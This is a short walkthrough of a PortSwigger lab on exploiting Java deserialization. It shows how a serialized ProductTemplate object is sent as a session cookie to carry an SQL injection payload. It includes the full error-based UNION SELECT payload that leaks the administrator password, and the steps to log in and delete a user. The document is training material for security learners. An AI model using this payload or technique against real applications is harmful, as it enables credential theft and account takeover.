# [Developing a custom gadget chain for Java deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)

> delete carlos user by logging in as administrator using custom java tool for sql injection to get the admin password

- open the lab in burp browser
- login with `wiener:peter`
- send a `/` request to the repeater (for later use)
- check the target -> site map in burp
- look for a `GET /backup/AccessTokenUser.java` request
- send it to the repeater and sand it only as `GET /backup`
- there will be a line with

```html
<a href="/backup/ProductTemplate.java">ProductTemplate.java</a>
```

- send a new request updated as `GET /backup/ProductTemplate.java`
- it will give back a java file where the interesting part is:

```
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```

- the `id` might be vulnerable to `sql` injection

## exploit tool

- a small Java program that instantiates a `ProductTemplate` with an arbitrary `id` would be useful
- use this [tool](https://github.com/PortSwigger/serialization-examples)
- in the `serialization-examples/java/solution` the `Main.java` file is the important one to look for
- update the following line like this from:

```
ProductTemplate originalObject = new ProductTemplate("your-payload-here");
```

- to:

```
ProductTemplate originalObject = new ProductTemplate("'");
```

- use the generated token as the cookie for the `/` request
- you will get back a `500` response like this

```
java.io.IOException: org.postgresql.util.PSQLException: Unterminated string literal started at position 36 in SQL SELECT * FROM products WHERE id = &apos;&apos;&apos; LIMIT 1. Expected  char
```

- this is a good indication for the options for sql injection
- after many testing the following will give back the administrator password

```
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
```

- create the new exploit token with the java tool
- insert it as a cookie ans send the request
- the password should be in the error message
- log in as `administrator` and delete the carlos user
